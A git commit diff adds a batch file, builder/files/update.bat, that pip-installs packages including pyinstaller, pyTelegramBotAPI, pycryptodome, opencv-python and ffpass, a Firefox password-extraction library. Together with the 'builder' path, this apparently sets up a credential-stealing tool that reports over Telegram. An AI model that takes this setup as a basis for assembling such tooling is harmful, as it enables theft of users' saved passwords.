c3a0a43f6a57e5f0d61b6db1bbe855acc56bac00
Nick Vinesmoke <123866627+Nick-Vinesmoke@users.noreply.github.com>
2023-03-16 16:13:47 +0200

    🗃files

---
+++ source code of builder/files/update.bat
@@ -0,0 +1,13 @@
+pip install --upgrade pip
+pip install pyinstaller
+pip install requests
+pip install pywin32
+pip install opencv-python
+pip install Pillow
+pip install pyTelegramBotAPI
+pip install psutil
+pip install GPUtil
+pip install tabulate
+pip install pycryptodome
+pip install configparser
+pip install ffpass
